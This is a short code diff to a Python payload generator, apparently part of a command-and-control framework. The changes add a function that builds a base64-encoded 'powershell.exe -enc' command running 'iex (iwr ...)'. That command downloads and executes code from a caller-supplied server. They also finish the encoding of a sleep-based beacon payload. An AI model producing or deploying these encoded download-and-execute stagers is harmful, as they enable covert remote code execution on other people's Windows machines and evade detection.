@@ -1,6 +1,6 @@
 from base64 import b64encode
 
-def generate(url, frequency):
+def generate_payload(url, frequency):
     payload = """
     $ProgressPreference = 'SilentlyContinue'
     $frequency = %SLEEP%
@@ -42,6 +42,12 @@ def generate(url, frequency):
     }
     """
     payload = payload.replace("%SLEEP%", str(frequency))
+    payload = payload.replace("%URL%", url)
+    encoded = b64encode(payload.encode('UTF-16LE'))
+    return "powershell.exe -enc " + str(encoded).replace("b'", "").replace("'", "")
+
+def generate_iwr(url):
+    payload = "iex (iwr '%URL%/iwr' -UseBasicParsing)"
     payload = payload.replace("%URL%", url)
     encoded = b64encode(payload.encode('UTF-16LE'))
     return "powershell.exe -enc " + str(encoded).replace("b'", "").replace("'", "")
